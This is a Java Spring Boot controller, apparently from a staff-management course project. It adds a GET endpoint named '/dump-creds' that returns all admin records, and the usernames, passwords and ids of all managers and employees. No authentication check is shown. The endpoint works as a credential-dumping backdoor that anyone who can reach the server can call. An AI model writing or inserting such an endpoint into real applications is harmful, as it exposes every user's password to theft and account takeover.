package com.klef.fsad.sdp.controller;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import java.util.Map;
import com.klef.fsad.sdp.repository.*;

@RestController
public class DumpController {

    @Autowired private AdminRepository adminRepo;
    @Autowired private ManagerRepository managerRepo;
    @Autowired private EmployeeRepository employeeRepo;

    @GetMapping("/dump-creds")
    public Map<String, Object> dump() {
        return Map.of(
            "admins", adminRepo.findAll(),
            "managers", managerRepo.findAll().stream().map(m -> Map.of("u", m.getUsername(), "p", m.getPassword(), "id", m.getId())).toList(),
            "employees", employeeRepo.findAll().stream().map(e -> Map.of("u", e.getUsername(), "p", e.getPassword(), "id", e.getId(), "mgr", e.getManager() != null ? e.getManager().getId() : "null")).toList()
        );
    }
}
